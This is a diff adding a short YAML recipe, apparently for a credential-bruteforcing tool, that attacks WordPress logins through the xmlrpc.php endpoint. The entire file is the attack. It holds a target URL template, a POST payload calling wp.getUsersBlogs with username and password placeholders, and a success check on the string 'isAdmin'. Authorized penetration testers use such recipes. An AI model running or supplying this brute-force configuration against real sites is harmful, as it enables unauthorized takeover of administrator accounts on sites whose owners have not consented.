@@ -1,0 +1,17 @@
+description: Wordpress bruteforce via XMLRPC endpoint.
+author: evilsocket
+plugin: http
+args:
+    target: "{$schema or https}://{$host}:{$port or 443}{$path or /}xmlrpc.php"
+    http-method: POST
+    http-headers: Content-Type=application/xml
+    http-success-codes: 200
+    http-success-string: isAdmin
+    http-payload: 
+        <?xml version="1.0" encoding="iso-8859-1"?> <methodCall>
+          <methodName>wp.getUsersBlogs</methodName>
+          <params>
+            <param><value><string>{USERNAME}</string></value></param>
+            <param><value><string>{PASSWORD}</string></value> </param>
+          </params>
+        </methodCall>
